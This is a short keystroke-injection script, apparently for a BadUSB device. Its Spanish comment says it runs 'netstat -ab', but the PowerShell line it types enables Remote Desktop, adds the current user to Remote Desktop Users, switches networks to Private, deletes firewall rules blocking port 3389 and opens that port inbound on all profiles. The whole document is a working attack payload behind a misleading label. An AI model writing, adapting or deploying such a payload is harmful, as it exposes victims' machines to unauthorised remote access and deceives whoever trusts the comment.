REM Ejecutar netstat -ab desde PowerShell como administrador
DELAY 1000
STRING $u=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name; Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private; reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >$null; reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f >$null; Set-Service -Name TermService -StartupType Automatic; Start-Service -Name TermService; try{net localgroup "Remote Desktop Users" "$u" /add >nul 2>&1}catch{}; Get-NetFirewallRule | ?{ $_.Action -eq 'Block' -and (Get-NetFirewallPortFilter -AssociatedNetFirewallRule $_ -ea SilentlyContinue | %{$_.LocalPort}) -contains 3389 } | Remove-NetFirewallRule -ea SilentlyContinue; Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ea SilentlyContinue; New-NetFirewallRule -DisplayName "Allow Port 3389 (TCP-In)" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Profile Any -ea SilentlyContinue | Out-Null; New-NetFirewallRule -DisplayName "Allow Port 3389 (UDP-In)" -Direction Inbound -Action Allow -Protocol UDP -LocalPort 3389 -Profile Any -ea SilentlyContinue | Out-Null; Test-NetConnection -ComputerName localhost -Port 3389 | ft -Auto
ENTER
